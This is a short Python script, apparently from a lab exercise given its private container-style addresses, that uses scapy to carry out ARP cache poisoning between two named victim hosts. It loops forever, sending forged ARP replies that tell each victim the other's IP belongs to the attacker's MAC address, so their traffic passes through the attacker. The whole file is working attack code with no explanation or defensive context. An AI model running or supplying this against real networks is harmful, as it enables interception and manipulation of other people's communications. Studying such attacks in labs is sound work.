# arp_poison.py
from scapy.all import *
import time

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

def poison():
    while True:
        pkt_to_a = Ether(dst=a_mac)/ARP(op=2, psrc=b_ip, pdst=a_ip, hwsrc=m_mac, hwdst=a_mac)
        pkt_to_b = Ether(dst=b_mac)/ARP(op=2, psrc=a_ip, pdst=b_ip, hwsrc=m_mac, hwdst=b_mac)
        sendp(pkt_to_a, iface="eth0")
        sendp(pkt_to_b, iface="eth0")
        time.sleep(5)

poison()
